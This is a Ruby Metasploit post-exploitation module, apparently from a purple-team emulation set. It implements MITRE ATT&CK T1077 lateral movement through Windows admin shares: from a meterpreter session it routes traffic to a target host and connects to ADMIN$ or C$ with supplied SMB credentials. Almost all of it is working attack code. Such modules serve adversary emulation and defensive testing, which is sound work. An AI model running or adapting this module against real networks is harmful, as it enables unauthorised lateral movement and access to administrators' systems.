##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Windows Admin Shares (T1077) Windows - Purple Team',
                      'Description'   => %q{
                        Lateral Movement:
                        Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$.

                        Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over server message block (SMB) to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.

                        The Net utility can be used to connect to Windows admin shares on remote systems using net use commands with valid credentials.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1077' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))

    register_options(
    [
      OptString.new('SMBSHARE', [ true, 'The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share', 'ADMIN$' ]),
      OptAddress.new('RHOST' , [ true, 'Destination IP address.']),
      OptInt.new('SESSION', [ true, 'The session to run this module on.', 1]),
      OptString.new('SMBDOMAIN', [ true, 'The SMB Domain to use (default to current user).']),
      OptString.new('SMBUSER', [ true, 'The SMB User to use (default to current user).']),
      OptString.new('SMBPASS', [ true, 'The SMB Password to use (default to current user).'])
    ])
  end

  def run_autoroute()
    framework_mod = framework.modules.create('post/multi/manage/autoroute')
    framework_mod.datastore['SESSION'] = datastore['SESSION']
    framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
    framework_mod.datastore['CMD'] = "add"
    framework_mod.datastore['NETMASK'] = "255.255.255.255"
    framework_mod.datastore['SUBNET'] = datastore['RHOST']
    framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    framework_mod.run_simple(
      'LocalInput' => self.user_input,
      'LocalOutput' => self.user_output,
      'Quiet' => false,
      'RunAsJob'  => false)
  end

  def run_smb_share()
    framework_mod = framework.modules.create('auxiliary/admin/smb/smb_connect')
    framework_mod.datastore['RHOST'] = datastore['RHOST']
    framework_mod.datastore['SMBSHARE'] = datastore['SMBSHARE']
    framework_mod.datastore['SMBDOMAIN'] = datastore['SMBDOMAIN']
    framework_mod.datastore['SMBUSER'] = datastore['SMBUSER']
    framework_mod.datastore['SMBPASS'] = datastore['SMBPASS']
    framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
    framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
    framework_mod.run_simple(
      'LocalInput' => self.user_input,
      'LocalOutput' => self.user_output,
      'RunAsJob'  => false)
  end

  def run
    begin
      run_autoroute()

      print_status("Executing auxiliary/admin/smb/smb_connect on #{session.inspect}")
      run_smb_share()

      print_good("Module T1077W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1077W execution failed.")
    end
  end
end
